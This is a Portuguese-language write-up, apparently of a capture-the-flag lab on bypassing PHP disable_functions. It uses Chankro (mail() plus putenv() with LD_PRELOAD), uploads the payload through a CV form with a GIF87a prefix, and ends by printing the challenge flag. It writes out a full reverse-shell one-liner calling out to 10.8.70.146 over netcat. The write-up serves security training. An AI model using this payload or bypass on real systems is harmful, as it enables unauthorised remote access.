@@ -1,0 +1,173 @@
+# [**Bypass Disable Functions**]
+
+```
+Practice bypassing disabled dangerous features that run operating system commands or start processes.
+
+https://github.com/TarlogicSecurity/Chankro
+https://bugs.php.net/bug.php?id=46741
+```
+
+- php.ini
+    
+    O `php.ini` é um arquivo vital para configurar o PHP, uma linguagem de script muito usada na web. Ele ajusta o ambiente PHP, incluindo configurações de servidor, extensões, segurança e diretrizes, abordando aspectos como limites, funcionalidades e segurança. O `php.ini` é fundamental na configuração do servidor PHP e pode ser adaptado para atender às necessidades específicas de uma aplicação ou ambiente.
+    
+- system() e shell_exec()
+    
+    `system()` e `shell_exec()` são funções do PHP que permitem a execução de comandos do sistema operacional a partir de um script PHP, mas com algumas diferenças:
+    
+    - **`system()`:** Ela executa um comando do sistema e retorna somente a saída textual do último resultado. Por exemplo:
+        
+        ```php
+        $output = system("ls -l");
+        echo $output;
+        
+        ```
+        
+        Aqui, `system()` executa "ls -l" e mostra a saída do comando no navegador.
+        
+    - **`shell_exec()`:** Executa um comando do sistema e retorna a saída completa como uma string. Por exemplo:
+        
+        ```php
+        $output = shell_exec("ls -l");
+        echo $output;
+        
+        ```
+        
+        `shell_exec()` também executa "ls -l", mas retorna a saída completa como uma string que pode ser processada no PHP.
+        
+- dl()
+    
+    A função `dl()` é uma função do PHP que permite carregar dinamicamente uma extensão PHP em tempo de execução. Isso pode ser útil para adicionar funcionalidades específicas ao PHP que não estavam habilitadas quando o PHP foi compilado. No entanto, o uso da função `dl()` é desencorajado e desabilitado por padrão em muitas configurações de PHP por razões de segurança, uma vez que pode representar um risco de segurança se usado indevidamente.
+    
+- mail()
+    
+    A função `mail()` em PHP é usada para enviar e-mails. Você pode usar essa função para criar e enviar e-mails a partir de um script PHP. A função aceita vários parâmetros, incluindo o destinatário, o assunto, o corpo da mensagem e os cabeçalhos do e-mail. É importante configurar corretamente o servidor de envio de e-mails (SMTP) para que a função `mail()` funcione.
+    
+- putenv():
+    
+    A função `putenv()` em PHP é usada para definir variáveis de ambiente. Você pode usá-la para definir variáveis de ambiente específicas que afetarão o comportamento do script PHP ou de outros programas em execução no mesmo ambiente.
+    
+- Variável LD_PRELOAD:
+    
+    `LD_PRELOAD` é uma variável de ambiente em sistemas Unix/Linux que permite carregar uma biblioteca compartilhada (shared library) antes de qualquer outra biblioteca durante a inicialização de um programa. Isso pode ser usado para substituir ou interceptar funções em bibliotecas existentes, o que é útil para fins de depuração, profiling ou mesmo para implementar funcionalidades personalizadas. No entanto, se usado de forma inadequada, o `LD_PRELOAD` pode representar um risco de segurança, pois permite a injeção de código em processos em execução.
+    
+- Shared Library
+    
+    Uma biblioteca compartilhada (ou shared library) é um arquivo de código binário que contém funções e recursos que podem ser usados por vários programas. Em sistemas Unix/Linux, essas bibliotecas têm extensão ".so" (Shared Object). Elas são carregadas em tempo de execução por programas que dependem delas e permitem economizar espaço em disco e memória, pois as funções contidas nas bibliotecas não precisam ser duplicadas em cada programa.
+    
+    Bibliotecas compartilhadas são amplamente utilizadas em sistemas Unix/Linux para compartilhar código entre aplicativos, melhorar a manutenção e reduzir a redundância de código.
+    
+
+---
+
+1. **Utilização do Nmap:** Inicialmente, executei uma varredura no alvo com o Nmap para identificar as portas e serviços em execução, bem como coletar informações sobre o sistema. O comando utilizado foi o seguinte:
+    
+    ```
+    nmap -A -iL target
+    ```
+    
+    > `A`: Ativa a detecção de sistemas operacionais e outros tipos de detecção de serviços.
+    > 
+    > 
+    > `iL target`: Especifica o arquivo alvo contendo uma lista de endereços IP a serem verificados.
+    > 
+    
+    Isso forneceu informações valiosas para entender a configuração do servidor.
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/f8245eed-5c42-4f90-9eca-98c2e785a5b6/Untitled.png)
+    
+2. **Gobuster para identificação de diretórios:** Utilizei a ferramenta Gobuster para realizar uma varredura de diretórios no site do alvo. O comando usado foi:
+    
+    ```
+    gobuster dir -e -u target -w /path/to/wordlist -x php
+    ```
+    
+    > `e`: Habilita a extensão de arquivos durante a varredura.
+    > 
+    > 
+    > `u target`: Especifica a URL alvo que você deseja varrer.
+    > 
+    > `w /path/to/wordlist`: Define o caminho para a lista de palavras-chave usada na varredura.
+    > 
+    > `x php`: Especifica a extensão de arquivo que você deseja procurar durante a varredura (neste caso, arquivos PHP).
+    > 
+    
+    Isso resultou na descoberta dos diretórios `/phpinfo.php` e `/uploads`, que seriam explorados posteriormente.
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/acb9fb3a-af39-4f1f-a50e-5dbef3e47870/Untitled.png)
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/87147701-0fe9-4e89-8f7c-af2beb1efd81/Untitled.png)
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/1389482a-d5e8-4b1e-ae1c-f83646ce8f72/Untitled.png)
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/99fe2f6a-58ea-43d2-b611-7713be9fd8c6/Untitled.png)
+    
+3. **Ferramenta Chankro e Criação de Script:** Baixei a ferramenta Chankro (disponível em https://github.com/TarlogicSecurity/Chankro.git) e a utilizei para executar comandos por meio das funções `mail()` e `putenv()`, permitindo a manipulação de uma variável de ambiente.
+    
+    https://github.com/TarlogicSecurity/Chankro
+    
+    ```
+    git clone https://github.com/TarlogicSecurity/Chankro.git
+    cd Chankro
+    python2.7 chankro.py --help
+    ```
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/ab33ed8a-c062-4356-8341-725d226f3d61/Untitled.png)
+    
+4. **Criação de um Payload para Reverse Shell:** Criei um script para upload chamado "[c.sh](http://c.sh/)", que continha um payload de reverse shell. Utilizei o site [https://revshells.com](https://revshells.com/) para gerar o payload, que tinha o seguinte comando:
+    
+    ```
+    rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.70.146 4327 >/tmp/f
+    ```
+    
+    > `rm /tmp/f`: Remove o arquivo `/tmp/f`, se existir.
+    > 
+    > 
+    > `mkfifo /tmp/f`: Cria um fifo (named pipe) chamado `/tmp/f`.
+    > 
+    > `cat /tmp/f | sh -i 2>&1 | nc 10.8.70.146 4327 >/tmp/f`: Cria uma sequência de comandos que redireciona a saída padrão (stdout) do comando `cat` para uma shell interativa (`sh`) que se conecta ao IP `10.8.70.146` na porta `4327`. A saída da shell é redirecionada de volta para `/tmp/f`.
+    > 
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/8d014fba-e628-46a8-9933-1bab68e19829/Untitled.png)
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/78f5b6d7-d57a-4204-a0cc-08ebcc8f3ba5/Untitled.png)
+    
+5. **Uso da Ferramenta Chankro para Carregar o Payload:** Utilizei a ferramenta Chankro para carregar o payload no servidor. O comando executado foi o seguinte:
+    
+    ```
+    python2.7 chankro.py --arch 64 --input c.sh --output test.php --path /var/www/html/script_filename
+    ```
+    
+    > `-arch 64`: Especifica a arquitetura 64 bits para a execução.
+    > 
+    > 
+    > `-input c.sh`: Define o arquivo de entrada como `c.sh`.
+    > 
+    > `-output test.php`: Especifica o arquivo de saída como `test.php`.
+    > 
+    > `-path /var/www/html/script_filename`: Define o caminho para o diretório onde o arquivo de saída será colocado (neste caso, `/var/www/html/script_filename`).
+    > 
+    
+    Isso resultou no envio do script de reverse shell para o diretório `/uploads` no servidor.
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/00822821-22e9-474d-9c38-c17d1385a17b/Untitled.png)
+    
+6. **Exploração do Upload de CV com o Burp Suite:** Com o Burp Suite configurado como proxy, acessei a página de upload de currículos no site do alvo e realizei o upload do arquivo "test.php", que continha o payload de reverse shell.
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/c5e0179c-cda3-44d7-8a15-54c1aac4287c/Untitled.png)
+    
+7. **Modificação do Payload no Burp:** Utilizei o Burp Suite para interceptar a requisição de upload e modifiquei o payload. Adicionei a string "GIF87a" ao payload, pois o servidor permitia apenas uploads de imagens. Essa etapa permitiu que o arquivo fosse aceito como uma imagem.
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/ce9ab237-3e61-4b94-ae6f-c122ec764ef1/Untitled.png)
+    
+8. **Execução do Reverse Shell:** Após encaminhar a requisição modificada pelo Burp Suite, o upload do arquivo foi bem-sucedido. Em seguida, iniciei uma escuta de netcat (nc -lvnp 4327) na minha máquina e cliquei no payload inserido em `/uploads`. Isso resultou na execução do reverse shell, concedendo-me acesso à máquina-alvo.
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/8ed63ae0-d530-4281-b085-60021d768d59/Untitled.png)
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/db0eed6b-caf0-4dac-8e5b-ce6827df9bbd/Untitled.png)
+    
+9. **Obtenção da Flag do Desafio:** Com acesso à máquina-alvo, pude explorar o sistema, localizar e recuperar a flag solicitada, cumprindo o objetivo do desafio.
+    
+    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/be9cea7e-5c32-4d23-a40b-f581d39e78cb/827d1547-305e-4e2e-ac58-00d3f7484513/Untitled.png)
+    
+    `<y0uC4n’tst0pUs4ll/>`
